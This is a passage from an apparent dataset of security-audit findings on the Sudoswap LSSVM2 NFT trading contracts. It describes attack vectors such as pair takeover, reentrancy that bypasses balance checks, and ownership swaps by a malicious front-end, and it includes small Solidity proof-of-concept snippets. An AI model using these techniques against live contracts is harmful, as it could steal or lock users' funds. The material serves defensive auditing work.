_pullTokenInputAndPayProtocolFee(...) ... { ... _token.safeTransferFrom(msg.sender, _assetRecipient, saleAmount); ... } Proof Of Concept: // SPDX-License-Identifier: MIT pragma solidity ^0.8.18; import \"hardhat/console.sol\"; import {ERC20} from \"https://raw.githubusercontent.com/transmissions11/solmate/main/src/tokens/ERC20.sol\"; ,! import {SafeTransferLib} from \"https://raw.githubusercontent.com/transmissions11/solmate/main/src/utils/SafeTransferLib.sol\"; ,! contract test { using SafeTransferLib for ERC20; function t() public { ERC20 _token = ERC20(address(1)); _token.safeTransferFrom(msg.sender, address(0), 100); console.log(\"after safeTransferFrom\"); } }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "A malicious settings contract can call onOwnershipTransferred() to take over pair", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function onOwnershipTransferred() can be called from a pair via call(). This can be done It can either before transferOwnership() or after it. If it is called before then it updates the AssetRecipient. only be called after the transferOwnership() when an alternative (malicious) settings contract is used. In that situation pairInfos[] is overwritten and the original owner is lost; so effectively the pair can be taken over. Note: if the settings contract is malicious then there are different ways to take over the pair, but using this approach the vulnerabilities can be hidden. 11 function onOwnershipTransferred(address prevOwner, bytes memory) public payable { ILSSVMPair pair = ILSSVMPair(msg.sender); require(pair.poolType() == ILSSVMPair.PoolType.TRADE, \"Only TRADE pairs\"); ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "One can attempt to steal a pair's ETH", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Anyone can pass the enrolled pair's address instead of a splitter address in bulkWithdrawFees() to effectively call the pair's withdrawAllETH() instead of a splitter's withdrawAllETH(). Anyone can attempt to steal/drain all the ETH from a pair. However, the pair's withdrawAllETH() sends ETH to the owner, which in this case is the settings contract. The settings contract is unable to receive ETH as currently implemented. So the attempt reverts.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "swap() could mix tokens with ETH", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function swap() adds the output of swapNFTsForToken() to the ethAmount. Although this only happens when order.isETHSell == true , this value could be set to the wrong value accidentally or on purpose. Then the number of received ERC20 tokens could be added to the ethAmount, which is clearly unwanted. The resulting ethAmount is returned to the user. Luckily the router (normally) doesn't have extra ETH so the impact should be limited. function swap(Order calldata swapOrder) external payable { uint256 ethAmount = msg.value; if (order.isETHSell && swapOrder.recycleETH) { ... outputAmount = pair.swapNFTsForToken(...); ... ethAmount += outputAmount; ... } ... // Send excess ETH back to token recipient if (ethAmount > 0) { payable(swapOrder.tokenRecipient).safeTransferETH(ethAmount); } }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Using a single tokenRecipient in VeryFastRouter could result in locked NFTs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "VeryFastRouter uses a single tokenRecipient address for both ETH/tokens and NFTs, unlike LSSVMRouter which uses a separate tokenRecipient and nftRecipient. It is error-prone to have a single tokenRecipient receive both tokens and NFTs, especially when the other/existing LSSVMRouter has a separate nftRecipient. VeryFastRouter.swap() sends both sell order tokens to tokenRe- cipient and buy order NFTs to tokenRecipient. Front-ends integrating with both routers (or migrating to the new one) may surprise users by sending both tokens+NFTs to the same address when interacting with this router. This coupled with the use of nft.transferFrom() may result in NFTs being sent to contracts that are not ERC-721 receivers and get them locked forever.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Owner can mislead users by abusing changeSpotPrice() and changeDelta()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "A malicious owner could set up a pair which promises to buy NFTs for high prices. As soon as someone tries to trade, the owner could frontrun the transaction by setting the spotprice to 0 and gets the NFT for free. Both changeSpotPrice() and changeDelta() can be used to immediately change trade parameters where the aftereffects depends on the curve being used. Note: The swapNFTsForToken() parameter minExpectedTokenOutput and swapTokenForSpecificNFTs() param- eter maxExpectedTokenInput protect users against sudden price changes. But users might not always set them in an optimal way. A design goal of the project team is that the pool owner can quickly respond to changing market conditions, to prevent unnecessary losses. function changeSpotPrice(uint128 newSpotPrice) external onlyOwner { ... } function changeDelta(uint128 newDelta) external onlyOwner { ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Pair may receive less ETH trade fees than expected under certain conditions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Depending on the values of protocol fee and royalties, if _feeRecipient == _assetRecipient, the pair will receive less trade fees than expected. Assume a scenario where inputAmount == 100, protocolFee == 30, royaltyTotal == 60 and tradeFeeAmount == 20. This will result in a revert because of underflow in saleAmount -= tradeFeeAmount; when _feeRecipient != _assetRecipient. However, when _feeRecipient == _assetRecipient, the pair will receive trade fees of 100 - 30 - 60 = 10, whereas it normally would have expected 20.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Swapping tokens/ETH for NFTs may exhibit unexpected behavior for certain values of input amount, trade fees and royalties", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The _pullTokenInputAndPayProtocolFee() function pulls ERC20/ETH from caller/router and pays protocol fees, trade fees and royalties proportionately. Trade fees have a threshold of MAX_FEE == 50%, which allows 2*fee to be 100%. Royalty amounts could technically be any percentage as well. This allows edge cases where the protocol fee, trade fee and royalty amounts add up to be > inputAmount. In LSSVMPairERC20, the ordering of subtracting/transferring the protocolFee and royaltyTotal first causes the final attempted transfer of tradeFeeAmount to either revert because of unavailable funds or uses any balance funds from the pair itself. In LSSVMPairETH, the ordering of subtracting/transferring the tradeFees and royaltyTotal first causes the final attempted transfer of protocolFee to either revert because of unavailable funds or uses any balance funds from the pair itself.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "NFTs may be exchanged for 0 tokens when price decreases too much", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The sale of multiple NFTs, in combination with linear curves, results in a price decrease. When the resulting price is below 0, then getSellInfo() calculates how many NFTs are required to reach a price of 0. However, the complete number of NFTs is transferred from the originator of the transaction, even while the last few NFTs are worth 0. This might be undesirable for the originator. function getSellInfo(..., uint256 numItems, ... ) ... { ... uint256 totalPriceDecrease = delta * numItems; if (spotPrice < totalPriceDecrease) { ... uint256 numItemsTillZeroPrice = spotPrice / delta + 1; numItems = numItemsTillZeroPrice; } }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "balanceOf() can be circumvented via reentrancy and two pairs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "A reentrancy issue can occur if two pairs with the same ERC1155 NFTid are deployed. Via a call to swap NFTs, the ERC1155 callback onERC1155BatchReceived() is called. This callback can start a second NFT swap via a second pair. As the second pair has its own reentrancy modifier, this is allowed. This way the balanceOf() check of _takeNFTsFromSender() can be circumvented. If a reentrant call, to a second pair, supplies a sufficient amount of NFTs then the balanceOf() check of the original call can be satisfied at the same time. We haven't found a realistic scenario to abuse this with the current routers. Permissionless routers will certainly increase the risk as they can abuse isRouter == true. If the router is mali- cious then it also has other ways to steal the NFTs; however with the reentrancy scenario it might be less obvious this is happening. Note: ERC777 tokens also contain such a callback and have the same interface as ERC20 so they could be used in an ERC20 pair. function _takeNFTsFromSender(IERC1155 _nft, uint256 numNFTs, bool isRouter, address routerCaller) ... { ... if (isRouter) { ... uint256 beforeBalance = _nft.balanceOf(_assetRecipient, _nftId); ... router.pairTransferERC1155From(...); // reentrancy with other pair require((_nft.balanceOf(_assetRecipient, _nftId) - beforeBalance) == numNFTs, ...); // circumvented } else { ... } ,! }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Function call() is risky and can be restricted further", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function call() is powerful and thus risky. To reduce the risk it can be restricted further by dis- allowing potentially dangerous function selectors. This is also a step closer to introducing permissionless routers. function call(address payable target, bytes calldata data) external onlyOwner { ILSSVMPairFactoryLike _factory = factory(); require(_factory.callAllowed(target), \"Target must be whitelisted\"); (bool result,) = target.call{value: 0}(data); require(result, \"Call failed\"); } 16", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Incorrect newSpotPrice and newDelta may be obtained due to unsafe downcasts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "When calculating newSpotPrice in getBuyInfo(), an unsafe downcast from uint256 into uint128 may occur and silently overflow, leading to much less value for newSpotPrice than expected. function getBuyInfo( uint128 spotPrice, uint128 delta, uint256 numItems, uint256 feeMultiplier, uint256 protocolFeeMultiplier ) external pure override returns ( Error error, uint128 newSpotPrice, uint128 newDelta, uint256 inputValue, uint256 tradeFee, uint256 protocolFee ) { ... } // get the pair's virtual nft and token reserves uint256 tokenBalance = spotPrice; uint256 nftBalance = delta; ... // calculate the amount to send in uint256 inputValueWithoutFee = (numItems * tokenBalance) / (nftBalance - numItems); ... // set the new virtual reserves newSpotPrice = uint128(spotPrice + inputValueWithoutFee); // token reserve ... Same happens when calculating newDelta in getSellInfo(): function getSellInfo( uint128 spotPrice, uint128 delta, uint256 numItems, uint256 feeMultiplier, uint256 protocolFeeMultiplier ) external pure override returns ( Error error, uint128 newSpotPrice, uint128 newDelta, uint256 outputValue, uint256 tradeFee, uint256 protocolFee ) { PoC ... // get the pair's virtual nft and eth/erc20 balance uint256 tokenBalance = spotPrice; uint256 nftBalance = delta; ... // set the new virtual reserves newDelta = uint128(nftBalance + numItems); // nft reserve ... Proof of concept about how this wouldn't revert but silently overflow: 17 import \"hardhat/console.sol\"; contract test{ constructor() { uint256 a = type(uint128).max; uint256 b = 2; uint128 c = uint128(a + b); console.log(c); // c == 1, no error } }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Fewer checks in pairTransferNFTFrom() and pairTransferERC1155From() than in pairTransfer- ERC20From()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The functions pairTransferNFTFrom() and pairTransferERC1155From() don't verify that the cor- rect type of pair is used, whereas pairTransferERC20From() does. This means actions could be attempted on the wrong type of pairs. These could succeed for example if a NFT is used that supports both ERC721 and ERC1155. Note: also see issue \"pairTransferERC20From only supports ERC721 NFTs\" The following code is present in both LSSVMRouter and VeryFastRouter. function pairTransferERC20From(...) ... { require(factory.isPair(msg.sender, variant), \"Not pair\"); ... require(variant == ILSSVMPairFactoryLike.PairVariant.ERC721_ERC20, \"Not ERC20 pair\"); ... } function pairTransferNFTFrom(...) ... { require(factory.isPair(msg.sender, variant), \"Not pair\"); ... } function pairTransferERC1155From(...) ... { require(factory.isPair(msg.sender, variant), \"Not pair\"); ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "A malicious collection admin can reclaim a pair at any time to deny enhanced setting royalties", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "A collection admin can forcibly/selectively call reclaimPair() prematurely (before the advertised and agreed upon lockup period) to unilaterally break the settings contract at any time. This will effectively lead to a DoS to the pair owner for the enhanced royalty terms of the setting despite paying the upfront fee and agreeing to a fee split in return. This is because the unlockTime is enforced only on the previous pair owner and not on collection admins. A malicious collection admin can advertise very attractive setting royalty terms to entice pair owners to pay a high upfront fee to sign-up for their settings contract but then force-end the contract prematurely. This will lead to the pair owner losing the paid upfront fee and the promised attractive royalty terms. A lax pair owner who may not be actively monitoring SettingsRemovedForPair events before the lockup period will be surprised at the prematurely forced settings contract termination by the collection admin, loss of their earlier paid upfront fee and any payments of default royalty instead of their expected enhanced amounts.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "PropertyCheckers and Settings not sufficiently restricted", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The LSSVMPairFactory accepts any address for external contracts which contain critical logic but there are no sanity checks done on them. These are the _bondingCurve, _propertyChecker and settings con- tracts. The contracts could perhaps be updated later via a proxy pattern or a create2/selfdestruct pattern which means that it's difficult to completely rely on them. Both _propertyChecker and settings contracts have a factory associated: PropertyCheckerFactory and StandardSettingsFactory. It is straightforward to enforce that only contracts created by the factory can be used. For the bondingCurves there is a whitelist that limits the risk. function createPairERC721ETH(..., ICurve _bondingCurve, ..., address _propertyChecker, ...) ... { ... // no checks on _bondingCurve and _propertyChecker } function toggleSettingsForCollection(address settings, address collectionAddress, bool enable) public { ... // no checks on settings } function setBondingCurveAllowed(ICurve bondingCurve, bool isAllowed) external onlyOwner { bondingCurveAllowed[bondingCurve] = isAllowed; emit BondingCurveStatusUpdate(bondingCurve, isAllowed); }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "A malicious router can skip transfer of royalties and protocol fee", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "A malicious router, if accidentally/intentionally whitelisted by the protocol, may implement pair- TransferERC20From() functions which do not actually transfer the number of tokens as expected. This is within the protocol's threat model as evidenced by the use of before-after balance checks on the _assetRecipient for saleAmount. However, similar before-after balance checks are missing for transfers of royalties and protocol fee payments. the protocol/factory intention- Royalty recipients do not receive their royalties from the malicious router if ally/accidentally whitelists one. The protocol/factory may also accidentally whitelist a malicious router that does not transfer even the protocol fee.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Malicious front-end can sneak intermediate ownership changes to perform unauthorized actions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "LSSVMPair implements an onlyOwner multicall function to allow owner to batch multiple calls. Natspec indicates that this is \"Intended for withdrawing/altering pool pricing in one tx, only callable by owner, can- not change owner.\" The check require(owner() == msg.sender, \"Ownership cannot be changed in multi- call\"); with a preceding comment \"Prevent multicall from malicious frontend sneaking in ownership change\" indicates the intent of the check and that a malicious front-end is within the threat model. While the post-loop check prevents malicious front-ends from executing ownership changing calls that attempt to persist beyond the multicall, this still allows one to sneak in an intermediate ownership change during a call -> perform malicious actions under the new unauthorized malicious owner within onOwnershipTransferred() callback -> change ownership back to originally authorized msg.sender owner before returning from the callback and successfully executing any subsequent (onlyOwner) calls and the existing check. While a malicious front-end could introduce many attack vectors that are out-of-scope for detecting/preventing in backend contracts, an unauthorized ownership change seems like a critical one and warrants additional checks for onlyOwner multicall to prevent malicious actions from being executed in the context of any newly/temporarily unauthorized owner.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Missing override in authAllowedForToken prevents authorized admins from toggling settings and reclaiming pairs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Manifold admins are incorrectly not allowed by authAllowedForToken to toggle settings and reclaim their authorized pairs in the protocol context. authAllowedForToken checks for different admin overrides including admin interfaces of NFT marketplaces Nifty, Foundation, Digitalax and ArtBlocks. However, the protocol sup- ports royalties from other marketplaces of Manifold, Rarible, SuperRare and Zora. Of those, Manifold does have getAdmins() interface which is not considered in authAllowedForToken. And it is not certain that the others don't.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Misdirected transfers to invalid pair variants or non-pair recipients may lead to loss/lock of NFTs/tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Functions depositNFTs() and depositERC20() allow deposits of ERC 721 NFTs and ERC20 tokens after pair creation. While they check that the deposit recipient is a valid pair/variant for emitting an event, the deposit transfers happen prior to the check and without the same validation. With dual home tokens (see weird-erc20), the emit could be skipped when the \"other\" token is transferred. Also, the isPair() check in depositNFTs() does not specifically check if the pair variant is ERC721_ERC20 or ERC721_ETH. This allows accidentally misdirected deposits to invalid pair variants or non-pair recipients leading to loss/lock of NFTs/tokens.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "authAllowedForToken() returns prematurely in certain scenarios causing an authentication DoS", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Tokens listed on Nifty or Foundation (therefore returning a valid niftyRegistry or foundationTrea- sury) where the proposedAuthAddress is not a valid Nifty sender or a valid Foundation Treasury admin will cause an authentication DoS if the token were also listed on Digitalax or ArtBlocks and the proposedAuthAddress had admin roles on those platforms. This happens because the return values of valid and isAdmin for isValidNiftySender(proposedAuthAddress) and isAdmin(proposedAuthAddress) respectively are returned as-is instead of returning only if/when they are true but continuing the checks for authorization otherwise (if/when they are false) on Digitalax and ArtBlocks. toggleSettingsForCollection and reclaimPair (which utilize authAllowedForToken) would incorrectly fail for valid proposedAuthAddress in such scenarios. 21 return", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Medium Risk"]}, {"title": "Partial fills don't recycle ETH", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "After several fixes are applied, the following code exists. If the sell can be filled completely then ETH is recycled, however when a partial fill is applied then ETH is not recycled. This might lead to a revert and would require doing the trade again. This costs extra gas and the trading conditions might be worse then. function swap(Order calldata swapOrder) external payable returns (uint256[] memory results) { ... // Go through each sell order ... if (pairSpotPrice == order.expectedSpotPrice) { // If the pair is an ETH pair and we opt into recycling ETH, add the output to our total accrued if (order.isETHSell && swapOrder.recycleETH) { ... ... order.pair.swapNFTsForToken(... , payable(address(this)), ... ); } // Otherwise, all tokens or ETH received from the sale go to the token recipient else { ... order.pair.swapNFTsForToken(..., swapOrder.tokenRecipient, ... ); } } // Otherwise we need to do some partial fill calculations first else { ... ... order.pair.swapNFTsForToken(..., swapOrder.tokenRecipient, ... ); // ETH not recycled } // Go through each buy order ... }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Wrong allowances can be abused by the owner", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The function call() allows transferring tokens and NFTs that have an allowance set to the pair. Normally, allowances should be given to the router, but they could be accidentally given to the pair. Although call() is protected by onlyOwner, the pair is created permissionless and so the owner could be anyone.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Malicious router mitigation may break for deflationary tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "ERC20 _pullTokenInputAndPayProtocolFee() for routers has a mitigation for malicious routers by checking if the before-after token balance difference is equal to the transferred amount. This will break for any ERC20 pairs with fee-on-transfer deflationary tokens (see weird-erc20). Note that there has been a real-world exploit related to this with Balancer pool and STA deflationary tokens.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Inconsistent royalty threshold checks allow some royalties to be equal to sale amount", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Threshold checks on royalty amounts are implemented both in _getRoyaltyAndSpec() and its caller _calculateRoyalties(). While _calculateRoyalties() implements an inclusive check with require(saleAmount >= royaltyTotal, \"Royalty exceeds sale price\");, (allowing royalty to be equal to sale amount) the different checks in _getRoyaltyAndSpec() on the returned amounts or in the calculations on bps in _computeAmounts() exclude the saleAmount forcing royalty to be less than the saleAmount. However, only Known Origin and SuperRare are missing a similar threshold check in _getRoyaltyAndSpec(). This allows only the Known Origin and SuperRare royalties to be equal to the sale amount as enforced by the check in _calculateRoyalties().", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Numerical difference between getNFTQuoteForBuyOrderWithPartialFill() and _findMaxFill- ableAmtForBuy() may lead to precision errors", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "There is a slight numerical instability between the partial fill calculation and the first client side cal- culation (i.e. getNFTQuoteForSellOrderWithPartialFill() / getNFTQuoteForBuyOrderWithPartialFill(), _- findMaxFillableAmtForBuy() ). This is because getNFTQuoteForSellOrderWithPartialFill() first assumes a buy of 1 item, updates spotPrice/delta, and then gets the next subsequent quote to buy the next item. Whereas _findMaxFillableAmtForBuy() assumes buying multiple items at one time. This can for e.g. Exponential- Curve.sol and XykCurve.sol lead to minor numerical precision errors. function getNFTQuoteForBuyOrderWithPartialFill(LSSVMPair pair, uint256 numNFTs) external view returns ,! (uint256[] memory) { ... for (uint256 i; i < numNFTs; i++) { ... (, spotPrice, delta, price,,) = pair.bondingCurve().getBuyInfo(spotPrice, delta, 1, fee, ...); ... } } function getNFTQuoteForSellOrderWithPartialFill(LSSVMPair pair, uint256 numNFTs) external view returns ,! (uint256[] memory) { ... for (uint256 i; i < numNFTs; i++) { ... (, spotPrice, delta, price,,) = pair.bondingCurve().getSellInfo(spotPrice, delta, 1, fee, ... ); ... } ... } function _findMaxFillableAmtForBuy(LSSVMPair pair, uint256 maxNumNFTs, uint256[] memory ,! maxCostPerNumNFTs, uint256 ... while (start <= end) { ... (...) = pair.bondingCurve().getBuyInfo(spotPrice, delta, (start + end)/2, feeMultiplier, ,! protocolFeeMultiplier); ... } }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Differences with Manifold version of RoyaltyEngine may cause unexpected behavior", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Sudoswap has forked RoyaltyEngine from Manifold; however there are some differences. The Manifold version of _getRoyaltyAndSpec() also queries getRecipients(), while the Sudoswap version doesn't. This means the Sudoswap will not spread the royalties over all recipients. function _getRoyaltyAndSpec(...) // Manifold ,! ,! ... try IEIP2981(royaltyAddress).royaltyInfo(tokenId, value) returns (address recipient, uint256 amount) { ... try IRoyaltySplitter(royaltyAddress).getRecipients() returns (Recipient[] memory splitRecipients) { ... } } } function _getRoyaltyAndSpec(...) // Sudoswap ... try IEIP2981(royaltyAddress).royaltyInfo(tokenId, value) returns (address recipient, uint256 ,! amount) { ... } ... } } The Manifold version of getRoyalty() has an extra try/catch compared to the Sudoswap version. This protects against reverts in the cached functions. Note: adding an extra try/catch requires the function _getRoyaltyAnd- Spec() to be external. function getRoyalty(address tokenAddress, uint256 tokenId, uint256 value) ... { // Manifold ... try this._getRoyaltyAndSpec{gas: 100000}(tokenAddress, tokenId, value) returns ( ... ) .... } function getRoyalty(address tokenAddress, uint256 tokenId, uint256 value) ... { // Sudoswap ... ... (...) = _getRoyaltyAndSpec(tokenAddress, tokenId, value); }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Swaps with property-checked ERC1155 sell orders in VeryFastRouter will fail", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Any swap batch of transactions which has a property-checked sell order for ERC1155 will revert. Given that property checks are not supported on ERC1155 pairs (but only ERC721), swap sell orders for ERC1155 in VeryFastRouter will fail if order.doPropertyCheck is accidentally set because the logic thereafter assumes it is an ERC721 order.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "changeSpotPriceAndDelta() reverts when there is enough liquidity to support 1 sell", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "changeSpotPriceAndDelta() reverts when there is enough liquidity to support 1 sell because it uses > instead of >= in the check pairBalance > newPriceToSellToPair.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Lack of support for per-token royalties may lead to incorrect royalty payments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "The protocol currently lacks complete support for per-token royalties, assumes that all NFTs in a pair have the same royalty and so considers the first assetId to determine royalties for all NFT token Ids in the pair. If not, the pair owner is expected to make a new pair for NFTs that have different royalties. A pair with NFTs that have different royalties will lead to incorrect royalty payments for the different NFTs.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Missing additional safety for multicall may lead to lost ETH in future", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "If the function multicall() would be payable, then multiple delegated-to functions could use the same msg.value , which could result in losing ETH from the pair. A future upgrade of Solidity might change the default setting for function to payable. See Solidity issue#12539. function multicall(bytes[] calldata calls, bool revertOnFail) external onlyOwner { for (uint256 i; i < calls.length;) { (bool success, bytes memory result) = address(this).delegatecall(calls[i]); ... } }", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Missing zero-address check may allow re-initialization of pairs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "address(0), \"Initialized\");. However, without a zero-address check on _owner, this can be true even later if the pair is initialized accidentally with address(0) instead of msg.sender. This is because __Ownable_init in OwnableWithTransferCallback does not disallow address(0) unlike transferOwnership. This is however not the case with the current implementation where LSSVMPair.initialize() is called from LSSVMPairFactory with msg.sender as argument for _owner. it Therefore, LSSVMPair.initialize() may be called multiple times.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Trade pair owners are allowed to change asset recipient address when it has no impact", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Trade pair owners are allowed to change their asset recipient address using changeAssetRecipi- ent() while getAssetRecipient() always returns the pair address itself for Trade pairs as expected. Trade pair owners mistakenly assume that they can change their asset recipient address using changeAssetRe- cipient() because they are allowed to do so successfully, but may be surprised to see that it has no effect. They may expect assets at the new address but that will not be the case.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "NFT projects with custom settings and multiple royalty receivers will receive royalty only for first receiver", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "_calculateRoyalties() and its view equivalent only consider the first royalty receiver when custom settings are enabled. If non-ERC-2981 compliant NFT projects on Manifold/ArtBlocks or other platforms that support multiple royalty receivers come up with custom settings that pair owners subscribe to, then all the royalty will go to the first recipient. Other receivers will not receive any royalties.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Missing non-zero checks allow event emission spamming", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Functions depositNFTs() and depositERC20() are meant to allow deposits into the pair post- creation. However, they do not check if non-zero NFTs or tokens are being deposited. The event emission only checks if the pair recipient is valid. Given their permissionless nature, this allows anyone to grief the system with zero NFT/token deposits causing emission of events which may hinder indexing/monitoring systems.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Missing sanity zero-address checks may lead to undesired behavior or lock of funds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Certain logic requires zero-address checks to avoid undesired behavior or lock of funds. For exam- ple, in Splitter.sol#L34 users can permanently lock ETH by mistakenly using safeTransferETH with default/zero- address value.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Legacy NFTs are not compatible with protocol pairs", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "Pairs support ERC721 and ERC1155 NFTs. However, users of NFT marketplaces may also expect to find OG NFTs such as Cryptopunks, Etherrocks or Cryptokitties, which do not adhere to these ERC standards. For example, Cryptopunks have their own internal marketplace which allows users to trade their NFTs with other users. Given that Cryptopunks does not adhere to the ERC721 standard, it will always fail when the protocol attempts to trade them. Even with wrapped versions of these NFTs, people who aren't aware or have the original version won't be able to trade them in a pair.", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Unnecessary payable specifier for functions may allow ETH to be sent and locked/lost", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "LSSVMPair.initialize() which do not expect to receive and process Ether have the payable specifier which allows interacting users to accidentally send them Ether which will get locked/lost. LSSVMRouter.robustSwapERC20ForSpecificNFTsAndNFTsToToken() Functions", "labels": ["Spearbit", "SudoswapLSSVM2", "Severity: Low Risk"]}, {"title": "Obsolete Splitter contract may lead to locked ETH/tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/SudoswapLSSVM2-Spearbit-Security-Review.pdf", "body": "After a pair has be reclaimed via reclaimPair(), pairInfos[] will be emptied and 